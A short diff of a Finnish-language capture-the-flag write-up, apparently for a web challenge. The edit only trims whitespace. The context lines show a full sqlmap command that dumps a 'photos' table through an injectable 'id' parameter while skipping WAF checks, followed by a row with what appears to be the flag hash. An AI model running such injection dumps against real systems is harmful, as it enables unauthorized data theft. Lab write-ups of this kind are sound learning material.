@@ -17,5 +17,5 @@ Samaiselta sivulta löytyy myös aika paljon kaikkea muutakin mielenkiintoista. 
 Otetaanpa sitten dumppi sqlmapilla.
 
 sqlmap -u "http://urlfetch?id=1" --method=GET --dump -D level5 -T photos -p id --code=200 --ignore-code=500 --skip-waf --threads=2 -o. \
-Saadaan mukavan näköinen käppyrä tuosta photos taulusta ja erityisen kiinnostava on tuo sekasotku id 3:n kohdalla:   \ 
+Saadaan mukavan näköinen käppyrä tuosta photos taulusta ja erityisen kiinnostava on tuo sekasotku id 3:n kohdalla:\ 
 3  | Invisible        | 1      | f38d84cb4a9dba7a1703a5fe1a8f3ba5334e87394b7e838c55232c47b3b507ff
